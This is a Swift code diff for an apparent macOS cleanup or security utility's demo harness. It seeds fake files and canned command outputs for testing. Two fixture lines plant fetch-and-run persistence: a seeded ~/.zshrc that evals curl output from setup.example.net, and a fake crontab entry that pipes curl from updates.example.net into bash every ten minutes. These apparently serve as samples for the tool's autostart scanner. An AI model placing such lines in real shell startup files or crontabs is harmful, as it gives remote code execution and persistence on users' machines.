@@ -117,6 +117,7 @@ final class DemoMac: @unchecked Sendable {
         try seedLaunchItems()
         try seedPrivacyAndCloud()
         try seedExtras()
+        try seedSurveyFeatures()
         try seedActivity()
     }
 
@@ -298,6 +299,70 @@ final class DemoMac: @unchecked Sendable {
         try file("~/Library/Group Containers/DEMO123.com.example.shared/Library/Caches/thumbnails.db", mb: 3)
     }
 
+    private func seedSurveyFeatures() throws {
+        // Local AI models
+        let ollama = "~/.ollama/models"
+        try file("\(ollama)/blobs/sha256-base", mb: 180)
+        try file("\(ollama)/blobs/sha256-coder", mb: 130)
+        try file("\(ollama)/blobs/sha256-chat", mb: 70)
+        func manifest(_ path: String, _ digests: [String]) throws {
+            let json: [String: Any] = ["config": ["digest": digests[0]], "layers": digests.dropFirst().map { ["digest": $0] }]
+            let url = env.resolve("\(ollama)/manifests/registry.ollama.ai/\(path)")
+            try fm.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
+            try JSONSerialization.data(withJSONObject: json).write(to: url)
+        }
+        try manifest("library/llama3.2/3b", ["sha256:chat", "sha256:base"])
+        try manifest("library/qwen2.5-coder/7b", ["sha256:coder", "sha256:base"])
+        try file("~/.cache/huggingface/hub/models--mistralai--Mistral-7B-Instruct/blobs/x", mb: 180)
+        try file("~/.lmstudio/models/lmstudio-community/Phi-3.5-mini-GGUF/model.gguf", mb: 130)
+        try file("~/.cache/whisper/medium.pt", mb: 70)
+
+        // More project types
+        try small("~/Code/ml-notebook/pyproject.toml", daysOld: 45)
+        try file("~/Code/ml-notebook/.venv/lib/python3.12/site-packages/torch/lib.dylib", mb: 130)
+        try file("~/Code/ml-notebook/.pytest_cache/v/cache", mb: 1)
+        try small("~/Code/space-game/ProjectSettings/ProjectVersion.txt", daysOld: 200)
+        try file("~/Code/space-game/Library/ShaderCache/x", mb: 70)
+        try small("~/Code/infra/main.tf", daysOld: 20)
+        try file("~/Code/infra/.terraform/providers/aws", mb: 70)
+
+        // Other autostart places
+        try small("~/.zshrc", "export PATH=\"$HOME/bin:$PATH\"\neval \"$(curl -fsSL http://setup.example.net/env)\"\n")
+        let chrome = "~/Library/Application Support/Google/Chrome/Default/Extensions"
+        try small("\(chrome)/aapbdbdomjkkjkaonfhkkikfgjllcleb/2.0_0/manifest.json", #"{"name": "Translate Helper"}"#)
+        try small("\(chrome)/bmnlcjabgnpnenekpadlanbbkooimhnj/5.1_0/manifest.json", #"{"name": "Safe Finder Search"}"#)
+        try small("\(chrome)/cjpalhdlnbpafiamejdnhcphjbkeiagm/1.60_0/manifest.json", #"{"name": "Ad Blocker"}"#)
+        try small("~/Library/QuickLook/QLMarkdown.qlgenerator/Contents/Info.plist")
+
+        // Item 11: editor caches, old tool versions, Metal, heap dumps, VMs.
+        try file("~/Library/Application Support/Code/CachedData/1a2b3c/x", mb: 130)
+        try file("~/Library/Application Support/Code/Cache/Cache_Data/x", mb: 24)
+        try file("~/Library/Caches/JetBrains/IntelliJIdea2025.2/index/x", mb: 70)
+        for v in ["2.0.64", "2.1.12"] { try file("~/.local/share/claude/versions/\(v)", mb: 180) }
+        try file("~/.local/share/claude/versions/2.1.30", mb: 180)
+        try file("~/miniconda3/pkgs/pytorch-2.5/x", mb: 130)
+        try file("/System/Library/AssetsV2/com_apple_MobileAsset_MetalToolchain/toolchain/x", mb: 180)
+        try file("~/Code/billing-service/java_pid48213.hprof", mb: 70)
+        try file("~/VMs/Windows 11.pvm/harddisk.hdd/disk.hds", mb: 180, daysOld: 90)
+        try file("~/VMs/Ubuntu Server.utm/Data/disk.qcow2", mb: 130, daysOld: 300)
+
+        // Clean history: one clean still in the (fake) Trash, one emptied since.
+        let trash = base.appendingPathComponent("FakeTrash")
+        try fm.createDirectory(at: trash, withIntermediateDirectories: true)
+        let kept = trash.appendingPathComponent("com.example.Streamer")
+        try Data("x".utf8).write(to: kept)
+        let history = CleanHistory(fileURL: base.appendingPathComponent("state/clean-history.json"))
+        var junk = CleanReport()
+        junk.removed = [env.resolve("~/Library/Caches/com.example.Streamer.old")]
+        junk.freedBytes = 1_400_000_000
+        junk.trashed = [TrashedItem(original: env.resolve("~/Library/Caches/com.example.Streamer.old"), inTrash: kept, size: 1_400_000_000)]
+        var dev = CleanReport()
+        dev.removed = (0..<9).map { env.resolve("~/Code/old\($0)/node_modules") }
+        dev.freedBytes = 6_200_000_000
+        history.record(module: "Developer", report: dev, at: now.addingTimeInterval(-6 * 86_400))
+        history.record(module: "System Junk", report: junk, at: now.addingTimeInterval(-3_600))
+    }
+
     private func seedActivity() throws {
         let log = ActivityLog(fileURL: activityURL)
         for (days, module, mb, n) in [(28.0, "System Junk", 4_200, 312), (21, "Developer", 18_600, 9), (14, "Duplicates", 2_100, 14),
@@ -429,6 +494,13 @@ struct DemoRunner: CommandRunning {
             return ok("Preferred networks on en0:\n\tHome Network\n\tOffice Wi-Fi\n\tCoffee Shop Guest\n\tAirport Free Wi-Fi\n")
         }
         if cmd.hasPrefix("/bin/ps") { return ok(processes) }
+        if cmd.hasPrefix("/usr/bin/crontab -l") {
+            return ok("# nightly backup\n30 2 * * * /usr/local/bin/restic backup ~/Documents\n*/10 * * * * curl -s http://updates.example.net/u.sh | bash\n")
+        }
+        if cmd.hasPrefix("/usr/bin/systemextensionsctl list") {
+            return ok("1 extension(s)\nenabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n*\t*\tDEMO123456\tcom.example.vpn.extension (2.4/240)\tExample VPN\t[activated enabled]\n")
+        }
+        if cmd.hasPrefix("/usr/bin/xcodebuild -showComponent metaltoolchain") { return ok("Build Version: 17A100\nStatus: installed\n") }
         if cmd.hasPrefix("/usr/bin/fdesetup status") { return ok("FileVault is On.") }
         if cmd.hasPrefix("/usr/bin/csrutil status") { return ok("System Integrity Protection status: enabled.") }
         if cmd.hasPrefix("/usr/sbin/spctl --status") { return ok("assessments enabled") }
